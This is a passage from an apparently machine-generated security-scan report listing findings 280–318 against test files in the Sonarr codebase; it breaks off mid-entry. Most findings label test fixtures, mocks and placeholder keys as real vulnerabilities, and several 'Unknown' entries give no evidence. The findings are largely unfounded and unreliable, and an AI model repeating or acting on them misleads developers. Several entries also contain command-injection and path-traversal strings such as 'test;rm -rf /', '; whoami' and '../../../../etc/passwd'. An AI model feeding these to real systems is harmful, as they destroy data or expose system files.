**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-770_src_NzbDroneCoreTest_Download_DownloadClientTests_QBittorrentTests_QBittorrentFixturecs.py`
---

### 280. Exposure of Sensitive Information (CWE-200)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/HadoukenTests/HadoukenFixture.cs
**Line:** 100

**Description:**
The test code uses hardcoded test values that could expose sensitive information patterns in the actual implementation, particularly around torrent hash handling.

**Evidence:**
```
Hardcoded torrent hash values in tests that could indicate how sensitive data is handled in the actual implementation.
```

**Impact:**
If the actual implementation doesn't properly handle sensitive data like torrent hashes or other identifiers, it could expose information that helps attackers target specific torrents.

**Proof of Concept:**
If the actual Hadouken implementation doesn't properly sanitize or limit exposure of torrent hashes in logs or API responses, attackers could gather information about specific torrents.

**How to Test:**
1. Check API response formats for sensitive data exposure
2. Verify log output for sensitive information
3. Test with various torrent hash values to ensure proper handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_src_NzbDroneCoreTest_Download_DownloadClientTests_HadoukenTests_HadoukenFixturecs.py`
---

### 281. Missing Encryption of Sensitive Data (CWE-311)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/HadoukenTests/HadoukenFixture.cs
**Line:** 100

**Description:**
The test setup doesn't validate encryption of sensitive data, which could indicate missing encryption in the actual implementation.

**Evidence:**
```
Test data uses plain text values without encryption validation, suggesting potential missing encryption in the actual implementation.
```

**Impact:**
If the actual implementation doesn't encrypt sensitive data like API tokens or credentials, attackers could access this information in clear text.

**Proof of Concept:**
If the actual Hadouken implementation stores API tokens or credentials in plain text, an attacker with filesystem access could extract these sensitive values.

**How to Test:**
1. Check if sensitive data is encrypted in configuration storage
2. Verify encryption of API tokens and credentials
3. Test with various encryption scenarios

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-311_src_NzbDroneCoreTest_Download_DownloadClientTests_HadoukenTests_HadoukenFixturecs.py`
---

### 282. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/QBittorrentTests/QBittorrentFixture.cs
**Line:** 110

**Description:**
The test code includes multiple mock setups that throw exceptions, but doesn't validate proper exception handling in the actual implementation.

**Evidence:**
```
Multiple test methods with mock setups that throw InvalidOperationException, but no validation of how these exceptions are handled in the actual implementation.
```

**Impact:**
If the actual implementation doesn't properly handle exceptions from QBittorrent API calls, it could lead to unhandled exceptions, crashes, or inconsistent state.

**Proof of Concept:**
If the actual QBittorrent implementation doesn't properly catch and handle exceptions from API calls, a network failure or API error could cause Sonarr to crash or become inconsistent.

**How to Test:**
1. Test exception scenarios in actual QBittorrent implementation
2. Verify proper exception handling and recovery
3. Check error logging and user feedback for API failures

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCoreTest_Download_DownloadClientTests_QBittorrentTests_QBittorrentFixturecs.py`
---

### 283. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/ImmortalSeed.xml
**Line:** 1

**Description:**
Several TorrentRss XML files are missing proper XML declaration headers. The files start with '<?xml version="1.0"...' but contain invisible UTF-8 BOM characters at the beginning, which can cause parsing issues in some XML parsers.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_ImmortalSeedxml.py`
---

### 284. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/ImmortalSeed.xml
**Line:** 10

**Description:**
Different RSS feeds use varying date formats and time zones. Some use standard RFC 822 format while others use different conventions. This can lead to parsing inconsistencies when processing timestamps.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_ImmortalSeedxml.py`
---

### 285. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/ImmortalSeed.xml
**Line:** 15

**Description:**
In the ImmortalSeed feed, some items have incomplete enclosure information where the URL field is missing or malformed, potentially causing download failures.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_ImmortalSeedxml.py`
---

### 286. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/ImmortalSeed.xml
**Line:** 12

**Description:**
Different RSS feeds use inconsistent category naming and structure. Some use simple text categories while others use hierarchical structures or custom namespaces.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_ImmortalSeedxml.py`
---

### 287. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/ImmortalSeed.xml
**Line:** 18

**Description:**
RSS feeds contain HTML entities that may not be properly decoded, particularly in description fields. The presence of entities like &quot; and &amp; suggests potential encoding issues.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_ImmortalSeedxml.py`
---

### 288. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/ShowRSS.info.xml
**Line:** 10

**Description:**
The ShowRSS feed uses magnet links with multiple tracker parameters, but the format varies between different entries, potentially causing compatibility issues.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_ShowRSSinfoxml.py`
---

### 289. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/ShowRSS.info.xml
**Line:** 15

**Description:**
The ShowRSS feed uses custom namespaces (showrss:showid, showrss:episode) but these are not consistently handled across different parsers, potentially leading to data loss.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_ShowRSSinfoxml.py`
---

### 290. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/LimeTorrents.xml
**Line:** 20

**Description:**
Different RSS feeds use inconsistent size field formats (numeric values vs. human-readable strings), which can cause parsing errors when converting to standard units.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_LimeTorrentsxml.py`
---

### 291. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/ImmortalSeed.xml
**Line:** 11

**Description:**
RSS feeds use GUIDs but don't consistently validate their uniqueness or format, which can cause issues in duplicate detection and tracking.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_ImmortalSeedxml.py`
---

### 292. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/AwesomeHD.xml
**Line:** 25

**Description:**
RSS feed contains hardcoded authentication keys and passphrases that could be exploited if not properly validated or sanitized

**Evidence:**
```
Multiple instances of hardcoded authkey=redacted and torrent_pass=redacted in link and guid elements
```

**Impact:**
If these authentication tokens are not properly validated when used, attackers could potentially access unauthorized torrents or use stolen tokens for unauthorized downloads

**Proof of Concept:**
An attacker could intercept RSS feeds and replace 'redacted' values with valid tokens to access torrents without proper authentication

**How to Test:**
Parse RSS feeds and verify that authentication tokens are properly validated before being used in downstream requests

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_AwesomeHDxml.py`
---

### 293. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/speed.cd.xml
**Line:** 15

**Description:**
RSS feed contains hardcoded passkey values that could be exploited if not properly validated

**Evidence:**
```
Multiple instances of key=SECRETKEY in link elements throughout the feed
```

**Impact:**
Hardcoded passkeys in RSS feeds could allow unauthorized access to torrents if these keys are not properly validated or rotated

**Proof of Concept:**
An attacker could use the hardcoded SECRETKEY values from RSS feeds to directly download torrents without proper authentication

**How to Test:**
Verify that RSS feed parsing properly validates and sanitizes passkey values before using them in API calls

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_speedcdxml.py`
---

### 294. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/BitHdtv.xml
**Line:** 30

**Description:**
RSS feed contains hardcoded IDs that could be exploited if not properly validated

**Evidence:**
```
Multiple instances of id=123 in link elements throughout the feed
```

**Impact:**
Hardcoded IDs in RSS feeds could allow unauthorized access to specific torrents or content if not properly validated

**Proof of Concept:**
An attacker could modify RSS feeds to use different hardcoded IDs to access unauthorized content

**How to Test:**
Verify that RSS feed parsing validates IDs against expected ranges or valid values before using them

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_BitHdtvxml.py`
---

### 295. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/TransmitTheNet.xml
**Line:** 18

**Description:**
RSS feed contains hardcoded authentication values that could be exploited if not properly validated

**Evidence:**
```
Multiple instances of auth=abc in link and enclosure URL parameters
```

**Impact:**
Hardcoded authentication values in RSS feeds could allow unauthorized access to torrents or content

**Proof of Concept:**
An attacker could replace hardcoded auth values in RSS feeds to access torrents with different authentication

**How to Test:**
Verify that RSS feed parsing validates authentication parameters against expected values before using them

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_TransmitTheNetxml.py`
---

### 296. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/AnimeTosho_NoSize.xml
**Line:** 25

**Description:**
RSS feed contains hardcoded URLs with potential for path traversal or injection

**Evidence:**
```
URLs with encoded characters and parameters that could be manipulated
```

**Impact:**
If not properly validated, these URLs could be manipulated to access unauthorized resources or trigger path traversal

**Proof of Concept:**
An attacker could modify the encoded URLs in RSS feeds to include path traversal sequences

**How to Test:**
Parse RSS feed URLs and validate that they don't contain path traversal sequences or unexpected parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_AnimeTosho_NoSizexml.py`
---

### 297. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/Ezrss.xml
**Line:** 25

**Description:**
RSS feed contains hardcoded magnet URIs and info hashes that could be exploited

**Evidence:**
```
Magnet URIs with hardcoded info hashes and file names in torrent elements
```

**Impact:**
Hardcoded info hashes in RSS feeds could allow attackers to manipulate torrent downloads or use malicious torrents

**Proof of Concept:**
An attacker could modify the infoHash values in RSS feeds to point to malicious torrents

**How to Test:**
Verify that RSS feed parsing validates infoHash values against expected ranges and that magnet URIs are properly sanitized

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_Ezrssxml.py`
---

### 298. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/speed.cd.xml
**Line:** 15

**Description:**
RSS feed contains hardcoded secret keys in cleartext format

**Evidence:**
```
passkey=SECRETKEY appears in multiple locations in the feed
```

**Impact:**
Secret keys stored in cleartext in RSS feeds could be easily extracted and used for unauthorized access

**Proof of Concept:**
Any user with access to the RSS feed file can easily extract the SECRETKEY value and use it for torrent downloads

**How to Test:**
Check RSS feed files for hardcoded secret values and verify they are not properly encrypted or obfuscated

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_speedcdxml.py`
---

### 299. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/AwesomeHD.xml
**Line:** 25

**Description:**
RSS feed contains hardcoded authentication tokens in cleartext format

**Evidence:**
```
authkey=redacted and torrent_pass=redacted appear in multiple locations in the feed
```

**Impact:**
Authentication tokens stored in cleartext in RSS feeds could be easily extracted and used for unauthorized access

**Proof of Concept:**
Any user with access to the RSS feed file can easily extract the redacted values and use them for torrent downloads

**How to Test:**
Check RSS feed files for hardcoded authentication tokens and verify they are not properly encrypted or obfuscated

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_AwesomeHDxml.py`
---

### 300. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/TransmitTheNet.xml
**Line:** 18

**Description:**
RSS feed contains hardcoded authentication values in cleartext format

**Evidence:**
```
auth=abc appears in multiple locations in the feed
```

**Impact:**
Authentication values stored in cleartext in RSS feeds could be easily extracted and used for unauthorized access

**Proof of Concept:**
Any user with access to the RSS feed file can easily extract the abc values and use them for torrent downloads

**How to Test:**
Check RSS feed files for hardcoded authentication values and verify they are not properly encrypted or obfuscated

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_TransmitTheNetxml.py`
---

### 301. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Xem/Names.txt
**Line:** 1

**Description:**
The XEM mapping files contain JSON data that could be vulnerable to insecure deserialization. The JSON structures include arrays and objects that could be manipulated to cause unexpected behavior or code execution.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Xem_Namestxt.py`
---

### 302. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/Files/Xem/Mappings.txt
**Line:** 1

**Description:**
The XEM files contain mapping data that could expose internal application logic or data structures to external parties, particularly the 'data' arrays and object structures.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_Files_Xem_Mappingstxt.py`
---

### 303. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core.Test/MediaFiles/DiskScanServiceTests/ScanFixture.cs
**Line:** 105

**Description:**
The test code uses path manipulation functions that could be vulnerable to command injection if paths contain special characters or sequences that get executed as commands.

**Evidence:**
```
The code uses AsOsAgnostic() and Path.Combine() extensively but doesn't validate or escape path components that might contain command injection vectors.
```

**Impact:**
While this is test code, the underlying implementation could be vulnerable to command injection if paths are not properly sanitized before being used in actual command execution.

**Proof of Concept:**
If a path contains shell metacharacters like ';', '&', '|', or '$', and these paths are used in command execution contexts, they could be exploited. For example, a path like 'test;rm -rf /' could execute arbitrary commands.

**How to Test:**
1. Add test cases with paths containing shell metacharacters 2. Verify that path components are properly escaped or validated 3. Test with various command execution contexts

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCoreTest_MediaFiles_DiskScanServiceTests_ScanFixturecs.py`
---

### 304. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core.Test/MediaFiles/DiskScanServiceTests/ScanFixture.cs
**Line:** 105

**Description:**
The test code uses array operations that could be vulnerable to index out of bounds errors, particularly when dealing with file lists and directory operations.

**Evidence:**
```
The code uses List<string> operations and array indexing without proper bounds checking in test scenarios, which could reveal underlying implementation vulnerabilities.
```

**Impact:**
Could lead to crashes or unexpected behavior in the actual implementation when processing large or malformed file lists.

**Proof of Concept:**
If a test case creates a scenario with empty or malformed file lists, the implementation might not properly handle array bounds, potentially causing crashes or incorrect behavior.

**How to Test:**
1. Create test cases with empty file lists 2. Test with very large file lists 3. Verify bounds checking in file processing operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCoreTest_MediaFiles_DiskScanServiceTests_ScanFixturecs.py`
---

### 305. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core.Test/MediaFiles/DiskScanServiceTests/ScanFixture.cs
**Line:** 105

**Description:**
The test code creates mock setups that might not properly validate or sanitize data before storing or processing, potentially exposing sensitive information.

**Evidence:**
```
The test code uses Builder patterns to create test data but doesn't validate that the generated data is properly sanitized or that sensitive information is handled correctly.
```

**Impact:**
Could expose sensitive information through improper data handling in test scenarios, potentially revealing implementation details or data processing vulnerabilities.

**Proof of Concept:**
If test data contains sensitive information that isn't properly sanitized, it could be exposed through test outputs or logging mechanisms.

**How to Test:**
1. Examine test data generation for sensitive information 2. Verify that test data is properly sanitized 3. Check for information disclosure in test outputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_MediaFiles_DiskScanServiceTests_ScanFixturecs.py`
---

### 306. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/MediaFiles/DiskScanServiceTests/ScanFixture.cs
**Line:** 105

**Description:**
The test code doesn't validate input parameters for path operations, which could reveal vulnerabilities in the actual implementation when processing malformed inputs.

**Evidence:**
```
The test code uses various path manipulation functions but doesn't include comprehensive input validation tests for edge cases like null paths, empty strings, or special characters.
```

**Impact:**
The actual implementation might not properly validate path inputs, leading to potential crashes or security issues when processing malformed paths.

**Proof of Concept:**
Test with null or empty path strings to see if the implementation properly handles these edge cases without crashing or exposing sensitive information.

**How to Test:**
1. Test with null path inputs 2. Test with empty path strings 3. Test with special characters in paths 4. Verify proper error handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_MediaFiles_DiskScanServiceTests_ScanFixturecs.py`
---

### 307. Command Injection (CWE-77)

**File:** src/NzbDrone.Core.Test/MediaFiles/EpisodeFileMovingServiceTests/MoveEpisodeFileFixture.cs
**Line:** 105

**Description:**
The test code uses mock setups that could be vulnerable to command injection if path operations are not properly sanitized.

**Evidence:**
```
The test code sets up IDiskProvider mocks with path operations but doesn't validate that these paths are properly sanitized before being used in command execution.
```

**Impact:**
If the actual implementation uses these paths in command execution contexts, command injection vulnerabilities could be exposed.

**Proof of Concept:**
If paths contain command injection vectors and are used in shell commands, they could execute arbitrary commands. For example, a path like 'test;rm -rf /' could be executed as a shell command.

**How to Test:**
1. Add command injection test cases to path operations 2. Verify that paths are properly escaped in command contexts 3. Test with various shell metacharacters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCoreTest_MediaFiles_EpisodeFileMovingServiceTests_MoveEpisodeFileFixturecs.py`
---

### 308. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core.Test/MediaFiles/EpisodeFileMovingServiceTests/MoveEpisodeFileFixture.cs
**Line:** 105

**Description:**
The test code uses various string operations that could be vulnerable to buffer overflows in the underlying implementation.

**Evidence:**
```
The test code uses string manipulation and path operations that might not properly handle buffer boundaries in the actual implementation.
```

**Impact:**
Could lead to crashes or potential code execution vulnerabilities in the actual implementation when processing long paths or strings.

**Proof of Concept:**
Test with very long path strings to see if the implementation properly handles buffer boundaries and doesn't overflow stack buffers.

**How to Test:**
1. Test with very long path strings 2. Verify buffer boundary handling 3. Check for stack overflow scenarios

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCoreTest_MediaFiles_EpisodeFileMovingServiceTests_MoveEpisodeFileFixturecs.py`
---

### 309. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Core.Test/Messaging/Commands/CommandEqualityComparerFixture.cs
**Line:** 105

**Description:**
The test code for command equality comparison doesn't fully validate the authenticity of command data, potentially exposing verification vulnerabilities.

**Evidence:**
```
The test code verifies command equality but doesn't thoroughly test data authenticity verification, which could be a weakness in the actual implementation.
```

**Impact:**
Could lead to incorrect command processing or potential exploitation if command data authenticity isn't properly verified.

**Proof of Concept:**
Test with malformed command data to see if the equality comparison properly validates data authenticity before processing.

**How to Test:**
1. Test with malformed command data 2. Verify data authenticity checks 3. Check for proper validation before command processing

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCoreTest_Messaging_Commands_CommandEqualityComparerFixturecs.py`
---

### 310. Improper Verification of Cryptographic Signature (CWE-347)

**File:** src/NzbDrone.Core.Test/Messaging/Commands/CommandEqualityComparerFixture.cs
**Line:** 105

**Description:**
The test code doesn't validate cryptographic signature verification, which could be a weakness in command processing.

**Evidence:**
```
The test code focuses on equality comparison but doesn't include cryptographic signature verification tests that might be part of the actual implementation.
```

**Impact:**
Could lead to command processing vulnerabilities if cryptographic signatures aren't properly verified.

**Proof of Concept:**
Test with commands that have invalid or missing cryptographic signatures to see if the system properly rejects them.

**How to Test:**
1. Add cryptographic signature verification tests 2. Test with invalid signatures 3. Verify proper rejection of unsigned commands

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-347_src_NzbDroneCoreTest_Messaging_Commands_CommandEqualityComparerFixturecs.py`
---

### 311. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Extras/ExtraServiceFixture.cs
**Line:** 107

**Description:**
The test code uses hardcoded paths that could be vulnerable to path traversal attacks if not properly validated in production code. The path manipulation in test setup could indicate potential input validation gaps.

**Evidence:**
```
Hardcoded paths like _seriesFolder = @"C:\Test\TV\Series Title".AsOsAgnostic() and _episodeFolder = @"C:\Test\Unsorted TV\Series.Title.S01".AsOsAgnostic() without validation of user input.
```

**Impact:**
If production code doesn't validate paths properly, attackers could manipulate file paths to access unauthorized files or directories.

**Proof of Concept:**
In production code, if user input is directly used to construct paths without validation, an attacker could provide input like '../../../../etc/passwd' to traverse directories.

**How to Test:**
Check if path construction in production code validates input and sanitizes paths before file operations. Look for path traversal vulnerabilities in file handling functions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Extras_ExtraServiceFixturecs.py`
---

### 312. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core.Test/Extras/ExtraServiceFixture.cs
**Line:** 150

**Description:**
The test setup uses mock configurations that could mask command injection vulnerabilities in production code. The test mocks disk provider operations that might be vulnerable to command injection.

**Evidence:**
```
Mock setup for IDiskProvider with Setup(s => s.FolderExists(It.IsAny<string>())) and Setup(s => s.GetParentFolder(It.IsAny<string>())) which could be vulnerable in production when actual command execution occurs.
```

**Impact:**
If production code executes shell commands or system calls with user input, command injection vulnerabilities could allow arbitrary command execution.

**Proof of Concept:**
If production code uses user input in system calls like Process.Start("cmd", "/c " + userInput) without proper sanitization, an attacker could inject commands like '; rm -rf /'

**How to Test:**
Review production code for system command execution with user input. Test with inputs containing shell metacharacters like ';', '&', '|', '&&', '||', '(', ')', '`', '$', '"', ''' etc.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCoreTest_Extras_ExtraServiceFixturecs.py`
---

### 313. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core.Test/Extras/ExtraServiceFixture.cs
**Line:** 107

**Description:**
Test code uses hardcoded paths and configuration values that could indicate potential cleartext storage of sensitive information in production code.

**Evidence:**
```
Hardcoded test paths and configuration values that might be replicated in production code without proper encryption or secure storage.
```

**Impact:**
If production code stores sensitive information like API keys, passwords, or configuration values in cleartext, attackers with filesystem access could extract this information.

**Proof of Concept:**
If production code stores API keys or database passwords in plain text configuration files, an attacker with filesystem access could read these values directly.

**How to Test:**
Check production code for sensitive information storage. Verify that passwords, API keys, and other secrets are not stored in cleartext. Look for hardcoded credentials in configuration files.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_Extras_ExtraServiceFixturecs.py`
---

### 314. Improper Limitation of a Pathname to a Restricted Directory (CWE-22)

**File:** src/NzbDrone.Core.Test/Extras/ExtraServiceFixture.cs
**Line:** 107

**Description:**
Test code uses hardcoded paths that could indicate potential path traversal vulnerabilities in production code when handling file operations.

**Evidence:**
```
Hardcoded paths in test setup that don't validate against allowed directories or use relative paths that could be manipulated.
```

**Impact:**
If production code doesn't properly validate file paths, attackers could access files outside of intended directories through path traversal.

**Proof of Concept:**
If production code allows user input to determine file paths without proper validation, an attacker could provide '../config.xml' to access configuration files outside of allowed directories.

**How to Test:**
Review production code for file path handling. Test with inputs containing '../', './', or absolute paths to ensure proper directory restrictions are enforced.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCoreTest_Extras_ExtraServiceFixturecs.py`
---

### 315. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core.Test/Extras/ExtraServiceFixture.cs
**Line:** 170

**Description:**
Test code uses List<string> with hardcoded values that could indicate potential array index validation issues in production code.

**Evidence:**
```
Test code uses hardcoded lists with specific indices that might not be validated properly in production code when handling dynamic arrays.
```

**Impact:**
If production code doesn't validate array indices before accessing elements, it could lead to buffer overflows or out-of-bounds access vulnerabilities.

**Proof of Concept:**
If production code accesses array elements with user-provided indices without bounds checking, an attacker could provide an out-of-bounds index to cause buffer overflow or information disclosure.

**How to Test:**
Check production code for array access patterns. Verify that all array indices are validated against array bounds before access. Test with invalid indices to ensure proper error handling.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCoreTest_Extras_ExtraServiceFixturecs.py`
---

### 316. Command Injection (CWE-77)

**File:** src/NzbDrone.Core.Test/Extras/ExtraServiceFixture.cs
**Line:** 150

**Description:**
Test code mocks disk provider operations that could mask command injection vulnerabilities in production code when actual file operations occur.

**Evidence:**
```
Mock setup for IDiskProvider operations that might be vulnerable to command injection in production when actual file system operations are performed.
```

**Impact:**
If production code executes system commands with user input, attackers could inject malicious commands to execute arbitrary code on the system.

**Proof of Concept:**
If production code uses user input in file operations that eventually translate to system commands, an attacker could inject commands like '; whoami' to execute arbitrary system commands.

**How to Test:**
Review production code for system command execution with user input. Test with inputs containing command injection characters like ';', '&', '|', '&&', '||', '(', ')', '`', '$', '"', ''' etc.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCoreTest_Extras_ExtraServiceFixturecs.py`
---

### 317. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Core.Test/Extras/ExtraServiceFixture.cs
**Line:** 150

**Description:**
Test code uses mock setups that might not fully validate data authenticity, potentially masking vulnerabilities in production code.

**Evidence:**
```
Mock setups for disk provider operations that don't validate the authenticity of file paths or content before processing.
```

**Impact:**
If production code doesn't verify the authenticity of data before processing, attackers could manipulate data to cause unexpected behavior or security issues.

**Proof of Concept:**
If production code processes files without verifying their authenticity (e.g., file signatures, checksums), an attacker could provide malicious files that are processed as legitimate.

**How to Test:**
Check production code for data validation and authenticity verification. Ensure that files are verified for integrity before processing. Test with malformed or malicious files to verify proper validation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCoreTest_Extras_ExtraServiceFixturecs.py`
---

### 318. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Libraries.Test/JsonTests/JsonFixture.cs
**Line:** 20

**Description:**
Test code uses JSON serialization/deserialization which could indicate potential deserialization vulnerabilities in production code.

**Evidence:**
```
